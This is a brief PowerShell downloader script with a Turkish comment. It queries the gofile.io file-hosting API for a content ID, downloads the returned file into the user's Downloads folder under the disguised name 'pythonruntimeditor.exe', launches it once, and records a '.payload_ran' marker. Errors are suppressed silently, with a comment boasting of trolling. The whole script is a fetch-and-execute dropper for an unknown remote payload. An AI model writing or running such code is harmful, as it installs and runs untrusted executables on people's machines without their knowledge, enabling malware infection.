$gofileCode = "lBhjqd"
$apiUrl = "https://api.gofile.io/getContent?contentId=$gofileCode&token=&websiteToken=websiteToken&cache=true"

try {
    $response = Invoke-WebRequest -Uri $apiUrl -UseBasicParsing -ErrorAction Stop
    $json = $response.Content | ConvertFrom-Json
    $directUrl = $json.data.contents.PSObject.Properties.Value[0].link

    $localPath = "$env:USERPROFILE\Downloads\pythonruntimeditor.exe"
    $markerPath = "$env:USERPROFILE\Downloads\.payload_ran"

    if (-not (Test-Path $localPath)) {
        Invoke-WebRequest -Uri $directUrl -OutFile $localPath -UseBasicParsing -ErrorAction Stop
    }

    if (-not (Test-Path $markerPath)) {
        Start-Process -FilePath $localPath -WindowStyle Normal
        New-Item -Path $markerPath -ItemType File -Force | Out-Null
    }
} catch {
    # Sessiz fail çünkü troll'üz
}
